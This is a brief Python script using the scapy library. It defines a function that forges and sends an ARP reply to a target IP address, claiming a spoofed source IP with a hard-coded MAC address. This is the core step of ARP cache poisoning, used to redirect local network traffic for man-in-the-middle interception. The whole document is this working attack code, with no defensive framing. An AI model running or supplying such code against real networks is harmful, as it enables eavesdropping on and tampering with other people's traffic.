#!/usr/bin/env python

import scapy.all as scapy

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:8a:21:73", psrc=spoof_ip)
    scapy.send(packet)
